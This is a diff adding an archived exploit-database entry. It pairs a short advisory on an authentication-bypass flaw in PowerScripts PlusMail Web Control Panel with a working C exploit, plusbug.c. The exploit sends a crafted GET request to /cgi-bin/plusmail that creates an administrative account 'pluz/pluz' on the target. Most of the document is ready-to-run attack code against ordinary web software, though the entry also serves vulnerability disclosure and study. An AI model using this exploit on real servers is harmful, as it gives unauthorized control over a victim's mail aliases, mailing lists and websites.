@@ -1,0 +1,78 @@
+source: http://www.securityfocus.com/bid/2653/info
+
+PowerScripts PlusMail Web Control Panel is a web-based administration suite for maintaining mailing lists, mail aliases, and web sites. It is reportedly possible to change the administrative username and password without knowing the current one, by passing the proper arguments to the plusmail script. After this has been accomplished, the web console allows a range of potentially destructive activities including changing of e-mail aliases, mailing lists, web site editing, and various other privileged tasks. This can be accomplished by submitting the argument "new_login" with the value "reset password" to the plusmail script (typically /cgi-bin/plusmail). Other arguments the script expects are "username", "password" and "password1", where username equals the new login name, password and password1 contain matching passwords to set the new password to.
+
+The specific affected versions have not been determined, and the developer cannot be located. 
+
+/*
+ * [Synnergy Networks http://www.synnergy.net]
+ * 
+ * Title:	plusbug.c - [remote plusmail exploit]
+ * Author:	headflux (hf@synnergy.net)
+ * Date:	01.10.2000
+ * Description:	plusmail fails to check authenticity before creating new
+ *		accounts
+ *
+ * [Synnergy Networks (c) 2000, http://www.synnergy.net]
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <sys/errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+int main(int argc, char *argv[])
+{
+    char *expcgi = "GET /cgi-bin/plusmail?login=pluz&password=pluz&"
+                   "password1=pluz&new_login=Login HTTP/1.0\n\n";
+
+    struct hostent *hp;
+    struct in_addr addr;
+    struct sockaddr_in s;
+    u_char buf[280];
+    int p, i;
+ 
+    if (argc < 1)
+    {
+        printf("usage: %s hostname\n", argv[0]);
+        exit(1);
+    } 
+
+    hp = gethostbyname(argv[1]);
+    if(!hp)
+    {
+        printf("bad hostname.\n");
+        exit(1);
+    }
+
+    bcopy (hp->h_addr, &addr, sizeof (struct in_addr));
+    p = socket (s.sin_family = 2, 1, IPPROTO_TCP);
+    s.sin_port = htons(80);
+    s.sin_addr.s_addr = inet_addr (inet_ntoa (addr));
+
+    if(connect (p, &s, sizeof (s))!=0)
+    {
+        printf("error: unable to connect.\n");
+  	return;
+    }
+    else
+    {
+        send(p, expcgi, strlen(expcgi), 0);
+        alarm(5);
+        read(p, buf, 255);
+        close(p);
+    }
+
+    if (strstr(buf, "200 OK") && ! strstr(buf, "Invalid"))
+        printf("account pluz/pluz created.\n");
+    else
+        printf("exploit failed.\n");
+
+    return(0);
+}
+/*                    www.hack.co.za           [21 July]*/
